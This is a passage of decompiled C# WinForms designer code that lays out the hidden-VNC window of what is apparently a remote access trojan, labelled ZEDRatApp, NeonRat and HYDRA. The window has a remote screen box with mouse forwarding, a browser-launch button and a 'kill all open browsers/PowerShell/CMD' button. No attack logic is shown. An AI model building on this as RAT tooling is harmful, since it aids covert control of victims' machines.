			this.bunifuToolTip1.SetToolTip(this.statusStrip1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.statusStrip1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.statusStrip1, "");
			this.toolStripStatusLabel3.Font = new System.Drawing.Font("Century Gothic", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.toolStripStatusLabel3.ForeColor = System.Drawing.Color.Gainsboro;
			this.toolStripStatusLabel3.Name = "toolStripStatusLabel3";
			this.toolStripStatusLabel3.Size = new System.Drawing.Size(51, 20);
			this.toolStripStatusLabel3.Text = "Status";
			this.PingStatusLabel.ForeColor = System.Drawing.Color.Gainsboro;
			this.PingStatusLabel.Name = "PingStatusLabel";
			this.PingStatusLabel.Size = new System.Drawing.Size(75, 20);
			this.PingStatusLabel.Text = "Ping: 0ms";
			this.PingStatusLabel.Visible = false;
			this.VNCBox.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.VNCBox.BackColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.VNCBox.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
			this.VNCBox.ErrorImage = null;
			this.VNCBox.InitialImage = null;
			this.VNCBox.Location = new System.Drawing.Point(26, 69);
			this.VNCBox.Name = "VNCBox";
			this.VNCBox.Size = new System.Drawing.Size(1196, 507);
			this.VNCBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.VNCBox.TabIndex = 297;
			this.VNCBox.TabStop = false;
			this.bunifuToolTip1.SetToolTip(this.VNCBox, "");
			this.bunifuToolTip1.SetToolTipIcon(this.VNCBox, null);
			this.bunifuToolTip1.SetToolTipTitle(this.VNCBox, "");
			this.VNCBox.MouseDown += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseDown);
			this.VNCBox.MouseEnter += new System.EventHandler(VNCBox_MouseEnter);
			this.VNCBox.MouseLeave += new System.EventHandler(VNCBox_MouseLeave);
			this.VNCBox.MouseHover += new System.EventHandler(VNCBox_MouseHover);
			this.VNCBox.MouseMove += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseMove);
			this.VNCBox.MouseUp += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseUp);
			this.chkStartStop.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.chkStartStop.BackColor = System.Drawing.Color.Transparent;
			this.chkStartStop.BackgroundColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkStartStop.BorderColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkStartStop.CheckColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.chkStartStop.CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
			this.chkStartStop.Cursor = System.Windows.Forms.Cursors.Hand;
			this.chkStartStop.DisabledBorderColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkStartStop.DisabledCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkStartStop.DisabledUnCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkStartStop.IsDerivedStyle = true;
			this.chkStartStop.Location = new System.Drawing.Point(26, 6);
			this.chkStartStop.Name = "chkStartStop";
			this.chkStartStop.Size = new System.Drawing.Size(58, 22);
			this.chkStartStop.Style = MetroSet_UI.Enums.Style.Custom;
			this.chkStartStop.StyleManager = null;
			this.chkStartStop.Switched = false;
			this.chkStartStop.SymbolColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.chkStartStop.TabIndex = 298;
			this.chkStartStop.Text = "metroSetSwitch7";
			this.chkStartStop.ThemeAuthor = "Narwin";
			this.chkStartStop.ThemeName = "MetroDark";
			this.bunifuToolTip1.SetToolTip(this.chkStartStop, "");
			this.bunifuToolTip1.SetToolTipIcon(this.chkStartStop, null);
			this.bunifuToolTip1.SetToolTipTitle(this.chkStartStop, "");
			this.chkStartStop.UnCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkStartStop.Visible = false;
			this.bunifuIconButton2.AllowAnimations = true;
			this.bunifuIconButton2.AllowBorderColorChanges = true;
			this.bunifuIconButton2.AllowMouseEffects = true;
			this.bunifuIconButton2.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton2.AnimationSpeed = 200;
			this.bunifuIconButton2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton2.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton2.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton2.BorderRadius = 1;
			this.bunifuIconButton2.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton2.BorderThickness = 1;
			this.bunifuIconButton2.ColorContrastOnClick = 30;
			this.bunifuIconButton2.ColorContrastOnHover = 30;
			this.bunifuIconButton2.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges30.BottomLeft = true;
			borderEdges30.BottomRight = true;
			borderEdges30.TopLeft = true;
			borderEdges30.TopRight = true;
			this.bunifuIconButton2.CustomizableEdges = borderEdges30;
			this.bunifuIconButton2.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton2.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton2.Image");
			this.bunifuIconButton2.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton2.Location = new System.Drawing.Point(47, 618);
			this.bunifuIconButton2.Name = "bunifuIconButton2";
			this.bunifuIconButton2.RoundBorders = false;
			this.bunifuIconButton2.ShowBorders = true;
			this.bunifuIconButton2.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton2.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton2.TabIndex = 299;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton2, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton2, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton2, "");
			this.bunifuIconButton2.Click += new System.EventHandler(operaGXToolStripMenuItem_Click);
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			this.bunifuIconButton28.AllowAnimations = true;
			this.bunifuIconButton28.AllowBorderColorChanges = true;
			this.bunifuIconButton28.AllowMouseEffects = true;
			this.bunifuIconButton28.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton28.AnimationSpeed = 200;
			this.bunifuIconButton28.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton28.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton28.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton28.BorderRadius = 1;
			this.bunifuIconButton28.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton28.BorderThickness = 1;
			this.bunifuIconButton28.ColorContrastOnClick = 30;
			this.bunifuIconButton28.ColorContrastOnHover = 30;
			this.bunifuIconButton28.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges31.BottomLeft = true;
			borderEdges31.BottomRight = true;
			borderEdges31.TopLeft = true;
			borderEdges31.TopRight = true;
			this.bunifuIconButton28.CustomizableEdges = borderEdges31;
			this.bunifuIconButton28.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton28.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton28.Image");
			this.bunifuIconButton28.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton28.Location = new System.Drawing.Point(871, 577);
			this.bunifuIconButton28.Name = "bunifuIconButton28";
			this.bunifuIconButton28.RoundBorders = false;
			this.bunifuIconButton28.ShowBorders = true;
			this.bunifuIconButton28.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton28.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton28.TabIndex = 300;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton28, "Hydra Kill All Open Browsers/Powershell/CMD!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton28, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton28, "HYDRA");
			this.bunifuIconButton28.Click += new System.EventHandler(bunifuIconButton28_Click);
			this.bunifuToolTip1.Active = true;
			this.bunifuToolTip1.AlignTextWithTitle = false;
			this.bunifuToolTip1.AllowAutoClose = false;
			this.bunifuToolTip1.AllowFading = true;
			this.bunifuToolTip1.AutoCloseDuration = 5000;
			this.bunifuToolTip1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuToolTip1.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuToolTip1.ClickToShowDisplayControl = false;
			this.bunifuToolTip1.ConvertNewlinesToBreakTags = true;
			this.bunifuToolTip1.DisplayControl = null;
			this.bunifuToolTip1.EntryAnimationSpeed = 350;
			this.bunifuToolTip1.ExitAnimationSpeed = 200;
			this.bunifuToolTip1.GenerateAutoCloseDuration = false;
			this.bunifuToolTip1.IconMargin = 6;
			this.bunifuToolTip1.InitialDelay = 0;
			this.bunifuToolTip1.Name = "bunifuToolTip1";
			this.bunifuToolTip1.Opacity = 1.0;
			this.bunifuToolTip1.OverrideToolTipTitles = false;
			this.bunifuToolTip1.Padding = new System.Windows.Forms.Padding(10);
			this.bunifuToolTip1.ReshowDelay = 100;
			this.bunifuToolTip1.ShowAlways = true;
			this.bunifuToolTip1.ShowBorders = false;
			this.bunifuToolTip1.ShowIcons = true;
			this.bunifuToolTip1.ShowShadows = true;
			this.bunifuToolTip1.Tag = null;
			this.bunifuToolTip1.TextFont = new System.Drawing.Font("Century Gothic", 11.25f);
			this.bunifuToolTip1.TextForeColor = System.Drawing.Color.White;
			this.bunifuToolTip1.TextMargin = 2;
			this.bunifuToolTip1.TitleFont = new System.Drawing.Font("Century Gothic", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.bunifuToolTip1.TitleForeColor = System.Drawing.Color.Silver;
			this.bunifuToolTip1.ToolTipPosition = new System.Drawing.Point(0, 0);
			this.bunifuToolTip1.ToolTipTitle = "NeonRat";
			this.bunifuIconButton29.AllowAnimations = true;
			this.bunifuIconButton29.AllowBorderColorChanges = true;
			this.bunifuIconButton29.AllowMouseEffects = true;
			this.bunifuIconButton29.AnimationSpeed = 200;
			this.bunifuIconButton29.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton29.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton29.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton29.BorderRadius = 1;
			this.bunifuIconButton29.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton29.BorderThickness = 1;
			this.bunifuIconButton29.ColorContrastOnClick = 30;
			this.bunifuIconButton29.ColorContrastOnHover = 30;
			this.bunifuIconButton29.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges32.BottomLeft = true;
			borderEdges32.BottomRight = true;
			borderEdges32.TopLeft = true;
			borderEdges32.TopRight = true;
			this.bunifuIconButton29.CustomizableEdges = borderEdges32;
			this.bunifuIconButton29.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton29.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton29.Image");
			this.bunifuIconButton29.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton29.Location = new System.Drawing.Point(26, 31);
			this.bunifuIconButton29.Name = "bunifuIconButton29";
			this.bunifuIconButton29.RoundBorders = false;
			this.bunifuIconButton29.ShowBorders = true;
			this.bunifuIconButton29.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton29.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton29.TabIndex = 301;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton29, "Some Help!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton29, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton29, "HYDRA");
			this.bunifuIconButton29.Click += new System.EventHandler(bunifuIconButton29_Click);
			base.AutoScaleDimensions = new System.Drawing.SizeF(10f, 21f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(1248, 681);
			base.Controls.Add(this.bunifuIconButton29);
			base.Controls.Add(this.bunifuIconButton28);
			base.Controls.Add(this.bunifuIconButton2);
			base.Controls.Add(this.chkStartStop);
			base.Controls.Add(this.VNCBox);
			base.Controls.Add(this.statusStrip1);
			base.Controls.Add(this.bunifuIconButton1);
			base.Controls.Add(this.ResizeScroll);
			base.Controls.Add(this.IntervalScroll);
			base.Controls.Add(this.QualityScroll);
			base.Controls.Add(this.bunifuIconButton27);
			base.Controls.Add(this.bunifuIconButton26);
			base.Controls.Add(this.bunifuIconButton25);
			base.Controls.Add(this.bunifuIconButton24);
			base.Controls.Add(this.bunifuIconButton23);
			base.Controls.Add(this.bunifuIconButton22);
			base.Controls.Add(this.MinBtn);
			base.Controls.Add(this.RestoreMaxBtn);
			base.Controls.Add(this.chkClone);
			base.Controls.Add(this.CloseBtn);
			base.Controls.Add(this.label1);
			base.Controls.Add(this.IntervalLabel);
			base.Controls.Add(this.ResizeLabel);
			base.Controls.Add(this.QualityLabel);
			base.Controls.Add(this.bunifuIconButton3);
			base.Controls.Add(this.bunifuIconButton4);
			base.Controls.Add(this.bunifuIconButton5);
			base.Controls.Add(this.bunifuIconButton6);
			base.Controls.Add(this.bunifuIconButton7);
			base.Controls.Add(this.bunifuIconButton8);
			base.Controls.Add(this.bunifuIconButton9);
			base.Controls.Add(this.bunifuIconButton10);
			base.Controls.Add(this.bunifuIconButton11);
			base.Controls.Add(this.bunifuIconButton12);
			base.Controls.Add(this.bunifuIconButton13);
			base.Controls.Add(this.bunifuIconButton14);
			base.Controls.Add(this.bunifuIconButton15);
			base.Controls.Add(this.bunifuIconButton16);
			base.Controls.Add(this.bunifuIconButton17);
			base.Controls.Add(this.bunifuIconButton18);
			base.Controls.Add(this.bunifuIconButton19);
			base.Controls.Add(this.bunifuIconButton20);
			base.Controls.Add(this.bunifuIconButton21);
			base.Controls.Add(this.bunifuSeparator3);
			base.Controls.Add(this.bunifuSeparator2);
			base.Controls.Add(this.bunifuSeparator1);
			base.Controls.Add(this.bunifuSeparator5);
			base.Controls.Add(this.metroSetControlBox1);
			this.Font = new System.Drawing.Font("Century Gothic", 12f);
			this.ForeColor = System.Drawing.Color.WhiteSmoke;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(5);
			base.Name = "FrmVNC";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "VncForm";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FrmVNC_FormClosed);
			base.Load += new System.EventHandler(FrmVNC_Load_1);
			base.Click += new System.EventHandler(FrmVNC_Click);
			this.statusStrip1.ResumeLayout(false);
			this.statusStrip1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)this.VNCBox).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
